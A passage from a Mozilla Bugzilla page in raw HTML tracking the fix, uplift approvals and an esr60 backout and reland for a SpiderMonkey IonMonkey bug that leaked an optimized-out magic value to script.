    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a169445_422187"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_422187" id="a169445_422187"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a169445_422187"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a169445_422187">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a169445_422187">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 03:12 PST" data-time="1551957146">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9048557&amp;action=edit"
           title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9048557</a> -
        Attachment description: Bug 1532599 - Force expected crashes on unexpected magic values. &rarr; (central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.</div></div></div><div class="change-set" id="a174715_600971"><div class="change" id="aa174715_600971">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600971" id="a174715_600971"><img src="https://secure.gravatar.com/avatar/a088418052679d9583556d277e6774ee?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_600971" id="a174715_600971"><a class="email " href="/user_profile?user_id=600971" > <span class="fna">Phabricator Automation</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a174715_600971"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a174715_600971">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a174715_600971">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 04:40 PST" data-time="1551962416">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9049131&amp;action=edit"
           title="Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9049131</a> -
        Attachment description: (esr60) Bug 1532599 - Force expected crashes on unexpected magic values. &rarr; Bug 1532599 - Force expected crashes on unexpected magic values.</div></div></div><div class="change-set" id="a178665_75935"><div class="change" id="aa178665_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a178665_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a178665_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a178665_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a178665_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a178665_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 05:46 PST" data-time="1551966366">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=%3F">?</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=isnotempty">tracking-firefox-esr60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=equals&amp;v1=66%2B">66+</a></div></div></div><div class="change-set" id="c14"><div class="comment" data-id="13971201" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a178665_75935"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a178665_75935"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 05:51 PST" data-time="1551966715">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-14" data-comment-id="13971201" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9048557" name="attach_9048557" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">attachment 9048557</a> <a href="/attachment.cgi?id=9048557&amp;action=edit" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">[details]</a></span><br>
(central &amp; beta) <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Force expected crashes on unexpected magic values.</p>
<h3>Beta/Release Uplift Approval Request</h3>
<ul>
<li><strong>Feature/Bug causing the regression</strong>: None</li>
<li><strong>User impact if declined</strong>: An attacker can leverage the current code to make a benign issue exploitable.  This patch convert this leveraged code-path into an expected crash.</li>
<li><strong>Is this code covered by automated tests?</strong>: Yes</li>
<li><strong>Has the fix been verified in Nightly?</strong>: No</li>
<li><strong>Needs manual test from QE?</strong>: No</li>
<li><strong>If yes, steps to reproduce</strong>:</li>
<li><strong>List of other uplifts needed</strong>: (none)</li>
<li><strong>Risk to taking this patch</strong>: Low</li>
<li><strong>Why is the change risky/not risky? (and alternatives if risky)</strong>: This patch convert a debug assertion into a release assertion.</li>
<li><strong>String changes made/needed</strong>: N/A</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9048557&amp;action=edit"
           title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9048557</a> -
        Flags: approval-mozilla-beta?</div></div></div><div class="change-set" id="c15"><div class="comment" data-id="13971206" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a178665_75935"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a178665_75935"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 05:53 PST" data-time="1551966832">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-15" data-comment-id="13971206" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9049131" name="attach_9049131" title="Bug 1532599 - Force expected crashes on unexpected magic values.">attachment 9049131</a> <a href="/attachment.cgi?id=9049131&amp;action=edit" title="Bug 1532599 - Force expected crashes on unexpected magic values.">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Force expected crashes on unexpected magic values.</p>
<h3>ESR Uplift Approval Request</h3>
<ul>
<li><strong>If this is not a sec:{high,crit} bug, please state case for ESR consideration</strong>: The current patch convert a sec-critical issue into a controlled crash.</li>
<li><strong>User impact if declined</strong>: An attacker can leverage the current code to make a benign issue exploitable. This patch convert this leveraged code-path into an expected crash.</li>
<li><strong>Fix Landed on Version</strong>: 67</li>
<li><strong>Risk to taking this patch</strong>: Low</li>
<li><strong>Why is the change risky/not risky? (and alternatives if risky)</strong>: This patch convert a debug assertion into a release assertion.</li>
<li><strong>String or UUID changes made by this patch</strong>: N/A</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9049131&amp;action=edit"
           title="Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9049131</a> -
        Attachment description: Bug 1532599 - Force expected crashes on unexpected magic values. &rarr; (esr60) Bug 1532599 - Force expected crashes on unexpected magic values.</div><div class="change">
        <a href="/attachment.cgi?id=9049131&amp;action=edit"
           title="Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9049131</a> -
        Flags: approval-mozilla-esr60?</div></div></div><div class="change-set" id="c16"><div class="comment" data-id="13971461" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a178665_75935"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a178665_75935"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 07:33 PST" data-time="1551972781">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9049207"
         class="attachment obsolete"
         data-id="9049207" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D22515-url.txt">
      <meta itemprop="contentSize" content="47">
      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9049207" itemprop="contentUrl">
        <span id="att-9049207-description" itemprop="description">Bug 1532599 - Prevent DepthFirstSearchUse from eagerly marking Phi as unused.</span></a> (obsolete)
        — <a href="attachment.cgi?id=9049207&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c17"><div class="comment" data-id="13971513" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a178665_75935"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a178665_75935"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 07:50 PST" data-time="1551973820">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-17" data-comment-id="13971513" data-ismarkdown="true" ><p>Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=9049207" name="attach_9049207" title="Bug 1532599 - Prevent DepthFirstSearchUse from eagerly marking Phi as unused.">attachment 9049207</a> <a href="/attachment.cgi?id=9049207&amp;action=edit" title="Bug 1532599 - Prevent DepthFirstSearchUse from eagerly marking Phi as unused.">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Prevent DepthFirstSearchUse from eagerly marking Phi as unused.</p>
<p>This patch fixes the Branch Pruning issue. The problem was that we were visiting a tree which is a sub-set of the list of uses of a given Phi instruction.  As we visit the tree of uses, we have to prevent looping infinitely through Phi instructions which we have already visited.</p>
<p>To avoid infinite loop, the <code>DepthFirstSearchUse</code> function was skipping the instructions which were in the work-list, but by doing so failed to take into account the usage analysis of this skipped instruction.  Thus a set of instructions were reported as being unused as (used-)skipped instructions did not contribute to flag all the Phi instruction of the loop as being used.</p>
<p>Consequently, this left some part of the graph with Phi instructions marked as unused, which is later converted to the magic optimized-out constant.</p>
<p>To fix this issue, we have to refrain the conclusion of flagging any Phi of a loop as Unused until we have visited all the Phi of the loop.  To do so, I added 2 new <code>PhiUsage</code> states, named <code>Undecided</code> and <code>UndecidedHeader</code>. These states are made to record the sequences of Phi involved in loops and record the Phi instruction which would be used to identify whether a loop is used or not.</p>
<p>When skipping a Phi instruction which is in the worklist, this implies that we identified a loop. Thus we mark every Phi in-between as being <code>Undecided</code> and the Phi as being <code>UndecidedHeader</code> as this is the first instruction of the loop visited with the depth-first-search. (Note: this might not be the Phi of the loop header)</p>
<p>When visiting an <code>UndecidedHeader</code>, we iterate over all operands which are marked as <code>Undecided</code> to flag them either as <code>Used</code> or <code>Unused</code>.</p>
</div></div><div class="change-set" id="c18"><div class="comment" data-id="13972236" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a178665_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a178665_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 11:49 PST" data-time="1551988174">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-18" data-comment-id="13972236" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9048557" name="attach_9048557" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">attachment 9048557</a> <a href="/attachment.cgi?id=9048557&amp;action=edit" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">[details]</a></span><br>
(central &amp; beta) <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Force expected crashes on unexpected magic values.</p>
<p>Forces us to crash instead of getting into exploitable situations. Approved for 66.0rc1 and 60.6esr.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9048557&amp;action=edit"
           title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9048557</a> -
        Flags: approval-mozilla-beta? &rarr; approval-mozilla-beta+</div></div></div><div class="change-set" id="a200475_75935"><div class="change" id="aa200475_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a200475_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a200475_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a200475_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a200475_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a200475_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 11:49 PST" data-time="1551988176">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9049131&amp;action=edit"
           title="Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9049131</a> -
        Flags: approval-mozilla-esr60? &rarr; approval-mozilla-esr60+</div></div></div><div class="change-set" id="c19"><div class="comment" data-id="13973387" data-no="19"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a200475_75935"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a200475_75935"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-08 01:05 PST" data-time="1552035933">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-19" data-comment-id="13973387" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/integration/autoland/rev/04d9abc278fad265656f3ed797f19b26becf1493" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/04d9abc278fad265656f3ed797f19b26becf1493</a><br>
<a href="https://hg.mozilla.org/mozilla-central/rev/04d9abc278fa" rel="nofollow">https://hg.mozilla.org/mozilla-central/rev/04d9abc278fa</a></p>
</div></div><div class="change-set" id="c20"><div class="comment" data-id="13973493" data-no="20"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a200475_75935"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a200475_75935"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-08 01:49 PST" data-time="1552038541">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags"><span class="comment-tag">uplift</span>
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-20" data-comment-id="13973493" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/releases/mozilla-beta/rev/5f4ba71d48892ddfc9e800aec521a46eaae175fd" rel="nofollow">https://hg.mozilla.org/releases/mozilla-beta/rev/5f4ba71d48892ddfc9e800aec521a46eaae175fd</a><br>
<a href="https://hg.mozilla.org/releases/mozilla-esr60/rev/c2c87ed541e9358436efd59014e8d0cdc3eb4d1f" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr60/rev/c2c87ed541e9358436efd59014e8d0cdc3eb4d1f</a></p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=isnotempty">status-firefox66</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="c21"><div class="comment" data-id="13973552" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a200475_75935"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a200475_75935"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-08 02:30 PST" data-time="1552041004">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-21" data-comment-id="13973552" data-ismarkdown="true" ><p>Backed out from esr60 for bustage in Value.h:</p>
<p><a href="https://hg.mozilla.org/releases/mozilla-esr60/rev/8e10c96cda3c97328c5c86edbb0848396917c3be" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr60/rev/8e10c96cda3c97328c5c86edbb0848396917c3be</a></p>
<p>Push with bustage: <a href="https://treeherder.mozilla.org/#/jobs?repo=mozilla-esr60&amp;resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&amp;group_state=expanded&amp;selectedJob=232395369&amp;revision=c2c87ed541e9358436efd59014e8d0cdc3eb4d1f" rel="nofollow">https://treeherder.mozilla.org/#/jobs?repo=mozilla-esr60&amp;resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&amp;group_state=expanded&amp;selectedJob=232395369&amp;revision=c2c87ed541e9358436efd59014e8d0cdc3eb4d1f</a><br>
Failure log: <a href="https://treeherder.mozilla.org/logviewer.html#?job_id=232615853&amp;repo=mozilla-esr60" rel="nofollow">https://treeherder.mozilla.org/logviewer.html#?job_id=232615853&amp;repo=mozilla-esr60</a><br>
[task 2019-03-08T09:56:10.495Z] 09:56:10 INFO - /builds/worker/workspace/build/src/obj-firefox/dist/include/js/Value.h:590:29: error: &#39;const union JS::Value::layout&#39; has no member named &#39;s_&#39;; did you mean &#39;s&#39;?<br>
[task 2019-03-08T09:56:10.495Z] 09:56:10 INFO - MOZ_RELEASE_ASSERT(data.s_.payload_.why_ == why);<br>
[task 2019-03-08T09:56:10.496Z] 09:56:10 INFO - ^</p>
<p>Line in current es60: <a href="https://hg.mozilla.org/releases/mozilla-esr60/file/ad8aa9fd2b56a3cba902f4468a38bbce4219e9f9/js/public/Value.h#l587" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr60/file/ad8aa9fd2b56a3cba902f4468a38bbce4219e9f9/js/public/Value.h#l587</a></p>
<pre><code>MOZ_ASSERT_IF(isMagic(), data.s.payload.why == why);
</code></pre>
<p>On central: <a href="https://searchfox.org/mozilla-central/rev/b2d35912da5b2acecb0274eb113777d344ffb75e/js/public/Value.h#659" rel="nofollow">https://searchfox.org/mozilla-central/rev/b2d35912da5b2acecb0274eb113777d344ffb75e/js/public/Value.h#659</a></p>
<p>Changed by <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1511181" title="RESOLVED FIXED - Reformat everything to the Google coding style (the actual change)">bug 1511181</a> (reformat to Google code style).</p>
<p>Relanded with the underscores removed: <a href="https://hg.mozilla.org/releases/mozilla-esr60/rev/46cd002b38f3244853d8baad318daa3c5eb51733" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr60/rev/46cd002b38f3244853d8baad318daa3c5eb51733</a></p>
</div></div><div class="change-set" id="c22"><div class="comment" data-id="13973666" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a200475_75935"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a200475_75935"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-08 04:01 PST" data-time="1552046506">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-22" data-comment-id="13973666" data-ismarkdown="true" ><p>Backed out because fix had been amended into the other patch which got pushed with this: <a href="https://hg.mozilla.org/releases/mozilla-esr60/rev/e04b9507d08639f5537ab9db90e22d220eadd52d" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr60/rev/e04b9507d08639f5537ab9db90e22d220eadd52d</a></p>
